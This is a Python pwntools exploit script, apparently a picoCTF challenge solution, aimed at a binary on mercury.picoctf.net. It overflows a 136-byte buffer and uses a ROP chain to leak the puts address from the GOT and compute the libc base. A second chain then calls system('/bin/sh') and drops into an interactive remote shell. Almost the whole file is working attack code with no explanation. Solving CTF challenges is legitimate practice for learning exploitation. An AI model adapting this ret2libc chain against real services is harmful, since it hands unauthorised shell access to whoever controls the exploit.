from pwn import *



padding = b"a" * 136
local = ELF("vuln")
libc = ELF("libc.so.6")



# find libc base address
log.info("finding libc base address")

puts_plt = local.plt["puts"]
puts_got = local.got["puts"]
main_offset = local.symbols["main"]

log.info("puts plt: %s", hex(puts_plt))
log.info("puts got: %s", hex(puts_got))
log.info("main offset: %s", hex(main_offset))

rop_bl = ROP(local)
pop_rdi_g = (rop_bl.find_gadget(["pop rdi", "ret"]))[0]
log.info("pop rdi, ret: %s", hex(pop_rdi_g))

rop_bl.raw(padding)
rop_bl.raw(p64(pop_rdi_g))
rop_bl.raw(p64(puts_got))
rop_bl.raw(p64(puts_plt))
rop_bl.raw(p64(main_offset))

log.info("payload: %s", rop_bl.dump())

r = remote("mercury.picoctf.net", 62289)
r.sendline(rop_bl.chain())

puts_addr_leaked = u64(r.recvlines(3)[2].ljust(8, b"\x00"))
log.info("leaked puts address: %s", hex(puts_addr_leaked))
libc.address = puts_addr_leaked - libc.symbols["puts"]




# execute /bin/sh
log.info("executing /bin/sh")

system_addr = libc.symbols["system"]
sh_addr = next(libc.search(b"/bin/sh"))
exit_addr = libc.symbols["exit"]

log.info("libc base address: %s", hex(libc.address))
log.info("address of system: %s", hex(system_addr))
log.info("address of /bin/sh: %s", hex(sh_addr))
log.info("address of exit: %s", hex(exit_addr))

rop = ROP(local)

rop.raw(padding)
# have to call system twice for some reason
rop.raw(p64(system_addr))
rop.raw(p64(pop_rdi_g))
rop.raw(p64(sh_addr))
rop.raw(p64(system_addr))

rop.raw(p64(exit_addr))

log.info("payload: %s", rop.dump())

r.clean()
r.sendline(rop.chain())
r.interactive()
